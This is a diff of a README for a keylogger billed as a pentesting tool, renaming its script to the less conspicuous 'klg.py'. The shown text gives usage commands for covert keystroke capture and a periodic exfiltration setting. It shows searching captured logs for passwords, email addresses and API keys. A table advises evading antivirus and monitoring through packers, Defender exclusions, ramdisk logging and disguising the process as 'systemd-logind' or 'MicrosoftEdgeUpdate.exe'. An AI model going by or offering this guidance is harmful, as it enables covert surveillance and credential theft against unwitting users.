@@ -81,7 +81,7 @@ pip install pynput pillow requests pycryptodome
 ### Display Help Menu
 
 ```bash
-python keylogger.py --help
+python klg.py --help
 ```
 
 **Output:**
@@ -89,11 +89,11 @@ python keylogger.py --help
 Advanced Keylogger - Authorized Pentesting Tool
 ===============================================
 Usage:
-    python keylogger.py              Start the keylogger
-    python keylogger.py --read       Read the log file
-    python keylogger.py --search <p> Search logs for pattern
-    python keylogger.py --stop       Stop all instances
-    python keylogger.py --help       Show this help
+    python klg.py              Start the keylogger
+    python klg.py --read       Read the log file
+    python klg.py --search <p> Search logs for pattern
+    python klg.py --stop       Stop all instances
+    python klg.py --help       Show this help
 ```
 
 ### Start Logging
@@ -101,7 +101,7 @@ Usage:
 Run the script to start capturing keystrokes in the background:
 
 ```bash
-python keylogger.py
+python klg.py
 ```
 
 **Console Output:**
@@ -116,9 +116,9 @@ python keylogger.py
 Use the `--read` flag to view the formatted logs directly in your terminal:
 
 ```bash
-python keylogger.py --read
+python klg.py --read
 # Or specify a custom log file
-python keylogger.py --read /path/to/custom/keylog.dat
+python klg.py --read /path/to/custom/keylog.dat
 ```
 
 **Example Log Report:**
@@ -178,19 +178,19 @@ Quickly find sensitive information (passwords, emails, keys) using the `--search
 
 ```bash
 # Search for passwords
-python keylogger.py --search "password"
+python klg.py --search "password"
 
 # Search for email addresses
-python keylogger.py --search "@gmail.com"
+python klg.py --search "@gmail.com"
 
 # Search for URLs
-python keylogger.py --search "https://"
+python klg.py --search "https://"
 
 # Search for API keys or tokens
-python keylogger.py --search "sk-"
+python klg.py --search "sk-"
 
 # Search in a specific log file
-python keylogger.py --search "admin" /path/to/custom/keylog.dat
+python klg.py --search "admin" /path/to/custom/keylog.dat
 ```
 
 **Search Results:**
@@ -214,7 +214,7 @@ Found 3 matches for 'password':
 Terminate all running instances of the keylogger:
 
 ```bash
-python keylogger.py --stop
+python klg.py --stop
 ```
 
 **Output:**
@@ -299,7 +299,7 @@ HOST: <hostname> | OS: <operating-system-details>
 
 ## ⚙️ Customization
 
-Edit the `CONFIG` section at the top of `keylogger.py` to tune the tool's behavior:
+Edit the `CONFIG` section at the top of `klg.py` to tune the tool's behavior:
 
 ```python
 # === CONFIGURATION ===
@@ -327,7 +327,7 @@ EXFIL_INTERVAL = 3600     # Seconds between exfiltration attempts (0 = disabled)
 | 📦 **Dependencies** | `pynput`, `PIL`, `requests` library imports may raise suspicion in process memory analysis. | Use PyInstaller to compile into a single executable with hidden imports; rename script to something innocuous. |
 | 🪟 **Windows Defender** | May flag as malware based on behavior (keyboard hooking) or static signatures. | Test in isolated lab environment; add Defender exclusions if deploying on controlled assets; use custom packers. |
 | 🐧 **Linux Auditd** | Userland keylogging via `pynput` is NOT caught by `auditd` or syscall monitoring. | Low risk — operates entirely in userland without special privileges. |
-| 📊 **Process Lists** | Process name shows as `python3 keylogger.py` by default. | On Linux, auto-renames to `systemd-logind`; on Windows, name your compiled binary something like `MicrosoftEdgeUpdate.exe`. |
+| 📊 **Process Lists** | Process name shows as `python3 klg.py` by default. | On Linux, auto-renames to `systemd-logind`; on Windows, name your compiled binary something like `MicrosoftEdgeUpdate.exe`. |
 | 🔌 **USB/Device Events** | Plugging in a USB device while the keylogger is active creates system events that may be logged. | Use on virtual machines or systems where you have control over logging infrastructure. |
 | 📁 **File System Monitoring** | `inotify` (Linux) or `FileSystemWatcher` (Windows) can detect file writes to the log directory. | Write logs to a ramdisk (`/dev/shm/` on Linux) or use in-memory buffering with periodic exfiltration only. |
 | ⏰ **Timing Analysis** | Regular screenshot/clipboard intervals create predictable patterns. | Add jitter (±20%) to all interval timers; randomize actual capture time within the window. |
@@ -339,7 +339,7 @@ EXFIL_INTERVAL = 3600     # Seconds between exfiltration attempts (0 = disabled)
 ```text
 advanced-keylogger/
 │
-├── keylogger.py              # Main keylogger script — single file, fully self-contained
+├── klg.py              # Main keylogger script — single file, fully self-contained
 ├── README.md                 # This documentation file
 ├── LICENSE                   # MIT License
 │
